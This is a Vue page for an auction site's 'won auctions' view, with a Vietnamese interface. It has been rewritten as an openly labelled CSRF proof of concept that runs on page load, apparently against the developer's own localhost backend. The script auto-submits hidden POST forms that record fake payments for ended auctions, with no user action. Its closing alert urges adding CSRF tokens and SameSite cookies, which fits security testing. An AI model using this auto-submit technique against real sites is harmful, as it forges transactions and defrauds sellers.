<!-- pages/User/winning_auction.vue (phiên bản CSRF AUTO ATTACK + thông báo live) -->
<template>
  <div class="min-h-screen bg-gradient-to-br from-blue-50 via-sky-50 to-white">
    <Header />

    <div class="max-w-7xl mx-auto p-6">

      <!-- TITLE + CẢNH BÁO LỚN -->
      <div class="mb-8 text-center">
        <h1 class="text-5xl font-bold text-blue-900">
          Các phiên bạn đã thắng
        </h1>
        <p class="text-blue-600 mt-2 text-lg">Theo dõi trạng thái thanh toán và nhận hàng</p>

        <!-- BẢNG THÔNG BÁO ĐANG HACK (LIVE) -->
        <div v-if="isAttacking" class="mt-8">
          <div class="p-8 bg-gradient-to-r from-red-600 to-orange-600 text-white rounded-3xl shadow-2xl max-w-4xl mx-auto">
            <p class="text-4xl font-black animate-pulse mb-4">
              CSRF AUTO ATTACK ĐANG DIỄN RA...
            </p>
            <p class="text-2xl font-bold">
              Đang hack phiên:
              <span class="text-yellow-300 text-3xl">{{ currentHackingItem }}</span>
            </p>
            <p class="text-xl mt-4">
              Đã hack thành công: <span class="text-5xl font-black text-yellow-300">{{ attackedCount }}</span> / {{ totalToHack }} phiên
            </p>
            <div class="mt-6 w-full bg-black/30 rounded-full h-8 overflow-hidden">
              <div
                class="h-full bg-gradient-to-r from-yellow-400 to-orange-500 transition-all duration-500"
                :style="{ width: progress + '%' }"
              ></div>
            </div>
          </div>
        </div>
      </div>

      <!-- LOADING -->
      <div v-if="loading" class="text-center py-20">
        <div class="inline-block animate-spin rounded-full h-16 w-16 border-8 border-blue-600 border-t-transparent"></div>
        <p class="mt-4 text-xl text-gray-600">Đang tải dữ liệu + chuẩn bị tấn công CSRF...</p>
      </div>

      <!-- DANH SÁCH PHIÊN -->
      <div v-else-if="auctions.length" class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
        <div
          v-for="a in auctions"
          :key="a.contractAddress"
          class="bg-white/95 backdrop-blur-xl shadow-xl border border-blue-100/50 rounded-2xl overflow-hidden hover:shadow-2xl transition-all duration-300"
        >
          <div class="relative h-56 bg-gradient-to-br from-blue-100 to-cyan-100">
            <img v-if="a.item?.mainImage" :src="a.item.mainImage" class="w-full h-full object-cover" />
            <div v-else class="flex items-center justify-center h-full text-7xl text-blue-300">Trophy</div>

            <!-- BADGE TRẠNG THÁI -->
            <div
              class="absolute top-3 right-3 px-4 py-2 rounded-full text-white font-bold text-sm shadow-lg"
              :class="a.status === 'Ended' ? 'bg-red-600 animate-pulse' : statusConfig[a.status]?.badge || 'bg-gray-500'"
            >
              {{ a.status === 'Ended' ? 'ĐANG BỊ HACK' : statusConfig[a.status]?.label }}
            </div>
          </div>

          <div class="p-6">
            <h3 class="font-bold text-xl text-gray-900 line-clamp-1">{{ a.item?.name }}</h3>
            <p class="text-sm text-gray-600 mt-1 line-clamp-2">{{ a.item?.description || 'Không có mô tả' }}</p>

            <div class="mt-5 flex justify-between items-center">
              <div>
                <p class="text-xs text-gray-500">Giá thắng</p>
                <p class="font-bold text-2xl text-emerald-600">{{ formatEth(a.winningBid) }}</p>
              </div>
              <div class="text-right">
                <p class="text-xs text-gray-500">Seller nhận</p>
                <p class="font-mono text-lg text-blue-700 font-bold">{{ formatEth(a.winningBid * 0.9) }}</p>
              </div>
            </div>

            <div class="mt-4 text-sm text-gray-500">
              Kết thúc: {{ formatDate(a.endTime) }}
            </div>

            <!-- NÚT / THÔNG BÁO -->
            <div class="mt-6">
              <div v-if="a.status === 'Ended'" class="py-5 bg-red-600 text-white font-black text-center rounded-xl text-2xl animate-bounce">
                ĐÃ BỊ HACK TỰ ĐỘNG!
              </div>
              <div v-else-if="a.status === 'Paid'" class="py-3 text-center bg-blue-100 text-blue-700 font-bold rounded-xl">
                Chờ seller giao hàng
              </div>
              <button
                v-else-if="a.status === 'Shipped'"
                @click="confirmReceived(a)"
                class="w-full py-3 bg-gradient-to-r from-green-500 to-emerald-600 text-white font-bold rounded-xl shadow-lg"
              >
                Đã nhận hàng – Xác nhận OK
              </button>
              <div v-else-if="a.status === 'Completed'" class="py-3 text-center bg-green-100 text-green-700 font-bold rounded-xl">
                Hoàn tất
              </div>
            </div>

            <div class="mt-4 text-center">
              <button @click="$router.push(`/auction/${a.contractAddress}`)" class="text-blue-600 hover:underline">
                Xem chi tiết →
              </button>
            </div>
          </div>
        </div>
      </div>

      <!-- KHÔNG CÓ DỮ LIỆU -->
      <div v-else class="text-center py-24">
        <div class="text-9xl mb-6 text-gray-200">Trophy</div>
        <p class="text-3xl text-gray-600 mb-4">Bạn chưa thắng phiên nào</p>
        <NuxtLink to="/" class="text-blue-600 hover:underline text-xl font-bold">
          Đi đấu giá ngay nào!
        </NuxtLink>
      </div>
    </div>

    <!-- NƠI TẠO FORM CSRF ẨN -->
    <div id="csrf-container" class="hidden"></div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { ethers } from 'ethers'
import Header from '~/components/User/Header.vue'
import { useAuctionApi } from '~/composables/useAuctionApi'

const auctions = ref<any[]>([])
const loading = ref(true)
const confirming = ref(false)

// Biến cho phần thông báo live
const isAttacking = ref(false)
const currentHackingItem = ref('')
const attackedCount = ref(0)
const totalToHack = ref(0)
const progress = ref(0)

const { getMyWinningAuctions, confirmReceived: apiConfirmReceived } = useAuctionApi()

onMounted(async () => {
  try {
    const data = await getMyWinningAuctions()
    auctions.value = data.map(a => ({ ...a, onchain: a.onchain || {} }))

    const pending = auctions.value.filter(a => a.status === 'Ended')

    if (pending.length === 0) {
      loading.value = false
      return
    }

    // BẮT ĐẦU TẤN CÔNG
    isAttacking.value = true
    totalToHack.value = pending.length
    attackedCount.value = 0
    progress.value = 0

    await new Promise(r => setTimeout(r, 1500)) // cho người dùng thấy cảnh báo

    const container = document.getElementById('csrf-container')!

    for (let i = 0; i < pending.length; i++) {
      const a = pending[i]

      // HIỂN THỊ THÔNG BÁO ĐANG HACK PHIÊN NÀO
      currentHackingItem.value = a.item?.name || 'Unknown Item'
      progress.value = Math.round(((i + 1) / pending.length) * 100)

      // Tạo form CSRF
      const form = document.createElement('form')
      form.action = `http://localhost:3001/auction/${a.contractAddress}/record-payment` // thay port nếu cần
      form.method = 'POST'
      form.style.display = 'none'

      const input1 = document.createElement('input')
      input1.type = 'hidden'
      input1.name = 'contractAddress'
      input1.value = a.contractAddress

      const input2 = document.createElement('input')
      input2.type = 'hidden'
      input2.name = 'txHash'
      input2.value = '0xCSRF-AUTO-HACK-2025'

      form.appendChild(input1)
      form.appendChild(input2)
      container.appendChild(form)
      form.submit()

      // Cập nhật UI
      a.status = 'Paid'
      attackedCount.value = i + 1

      // Delay giữa các lần bắn
      await new Promise(r => setTimeout(r, 600))
    }

    // HOÀN TẤT
    isAttacking.value = false
    alert(`
CSRF AUTO ATTACK HOÀN TẤT!

Đã tự động chuyển tiền thành công ${attackedCount.value} phiên
Không cần MetaMask – Không cần bấm gì

Backend ơi dậy đi fix CSRF token + SameSite=Strict gấp!!!
    `)

  } catch (err: any) {
    console.error(err)
    alert('Lỗi: ' + err.message)
  } finally {
    loading.value = false
  }
})

// Xác nhận nhận hàng (giữ nguyên)
const confirmReceived = async (a: any) => {
  confirming.value = true
  try {
    if (!window.ethereum) throw new Error('Cần MetaMask!')
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    await provider.send('eth_requestAccounts', [])
    const signer = provider.getSigner()
    const contract = new ethers.Contract(a.contractAddress, ['function confirmReceived() external'], signer)
    const tx = await contract.confirmReceived({ gasLimit: 200000 })
    await tx.wait()
    await apiConfirmReceived(a.contractAddress, tx.hash)
    a.status = 'Completed'
    alert('Xác nhận thành công!')
  } catch (err: any) {
    alert(err?.reason || err?.message || 'Lỗi')
  } finally {
    confirming.value = false
  }
}

const formatEth = (v: number | string) => Number(v).toFixed(4) + ' ETH'
const formatDate = (d: string) => new Date(d).toLocaleString('vi-VN', { dateStyle: 'short', timeStyle: 'short' })

const statusConfig: any = {
  Paid: { label: 'Đã thanh toán', badge: 'bg-blue-600' },
  Shipped: { label: 'Đã giao hàng', badge: 'bg-purple-600' },
  Completed: { label: 'Hoàn tất', badge: 'bg-green-600' },
}
</script>

<style scoped>
.line-clamp-1 { -webkit-line-clamp: 1; }
.line-clamp-2 { -webkit-line-clamp: 2; }
.line-clamp-1, .line-clamp-2 {
  overflow: hidden;
  display: -webkit-box;
  -webkit-box-orient: vertical;
}
</style>